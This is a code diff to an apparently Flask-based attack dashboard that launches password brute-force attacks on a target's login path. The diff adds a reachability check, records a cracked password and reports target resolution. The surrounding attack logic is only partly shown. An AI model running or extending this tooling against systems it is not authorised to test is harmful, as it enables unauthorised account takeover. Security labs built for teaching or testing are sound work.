@@ -26,6 +26,14 @@ def resolve_target_ip(ip_addr):
             return client_ip
     return ip_addr
 
+
+def check_target_reachable(ip_addr, port, timeout=2):
+    try:
+        with socket.create_connection((ip_addr, port), timeout=timeout):
+            return True, ''
+    except Exception as e:
+        return False, str(e)
+
 # ----------------------------
 # Attack Helper Functions
 # ----------------------------
@@ -60,6 +68,11 @@ def run_bruteforce_attack(ip_addr, port, path='/login'):
                             attack_state['attempts'] = attack_state['attempts'][-50:]
                         attack_state['message'] = f"Trying: {pw}"
                     brute_force.attempt_password(pw)
+                    if brute_force.FOUND:
+                        with attack_lock:
+                            attack_state['found_password'] = brute_force.FOUND_PASSWORD
+                            attack_state['message'] = f"Password found: {brute_force.FOUND_PASSWORD}"
+                        return
 
                 with ThreadPoolExecutor(max_workers=brute_force.THREADS) as ex:
                     for line in f:
@@ -131,6 +144,16 @@ def run_attack():
         original_ip = ip_addr
         ip_addr = resolve_target_ip(ip_addr)
         print(f"[attack_app] run_attack called: {attack_name} target={original_ip}:{port} path={path} resolved={ip_addr}")
+
+        reachable, error = check_target_reachable(ip_addr, port)
+        if not reachable:
+            error_msg = f"Target {ip_addr}:{port} not reachable from attack host: {error}"
+            print(f"[attack_app] {error_msg}")
+            attack_state.update({'status': 'idle', 'message': error_msg})
+            return jsonify({'success': False, 'error': error_msg}), 400
+
+        if original_ip != ip_addr:
+            attack_state['message'] = f"Resolved target {original_ip} to client host {ip_addr}."
 
         attack_state.update({
             'status': 'running',
